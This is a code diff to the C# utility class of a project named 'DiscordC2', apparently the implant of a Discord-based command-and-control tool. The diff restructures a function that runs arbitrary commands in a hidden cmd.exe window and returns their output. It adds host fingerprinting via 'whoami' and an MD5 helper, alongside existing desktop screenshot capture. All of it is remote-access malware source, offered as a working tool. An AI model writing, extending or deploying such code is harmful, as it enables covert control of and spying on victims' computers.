@@ -3,7 +3,12 @@ using System.Drawing.Imaging;
 using System.Diagnostics;
 using System.Data;
 using System.Runtime.InteropServices;
+using System.Dynamic;
+using DiscordC2.Init;
+using System.Security.Cryptography;
+using Microsoft.Extensions.DependencyInjection;
 
+namespace DiscordC2.Common;
 public static class Utils {
     [DllImport("user32.dll")]
     public static extern IntPtr GetDesktopWindow();
@@ -13,6 +18,9 @@ public static class Utils {
 
     [DllImport("gdi32.dll")]
     public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+
+    private static string _hostId = getHostId();
+    public static string HostId { get; set; } = _hostId;
 
 
     public static MemoryStream GetScreenshot()
@@ -34,12 +42,14 @@ public static class Utils {
     public static string ExecuteCommandline(string command)
     {
         Process process = new Process();
-        ProcessStartInfo startInfo = new ProcessStartInfo();
-        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-        startInfo.FileName = "cmd.exe";
-        startInfo.Arguments = $"/C {command}";
-        startInfo.RedirectStandardOutput = true;
-        startInfo.UseShellExecute = false;
+        ProcessStartInfo startInfo = new ProcessStartInfo
+        {
+            WindowStyle = ProcessWindowStyle.Hidden,
+            FileName = "cmd.exe",
+            Arguments = $"/C {command}",
+            RedirectStandardOutput = true,
+            UseShellExecute = false
+        };
         process.StartInfo = startInfo;
         process.Start();
         string output = process.StandardOutput.ReadToEnd();
@@ -69,5 +79,19 @@ public static class Utils {
         {
             yield return $"{chunk}";
         }
+    }
+
+    public static string getHostId() {
+        return ExecuteCommandline("whoami").Trim();
+    }
+
+    public static string MD5Hash(string input) {
+        MD5 md5 = Bootstrapper.ServiceProvider.GetRequiredService<MD5>();
+
+        byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
+        byte[] hashBytes = md5.ComputeHash(inputBytes);
+        
+        return Convert.ToHexString(hashBytes);
+
     }
 }
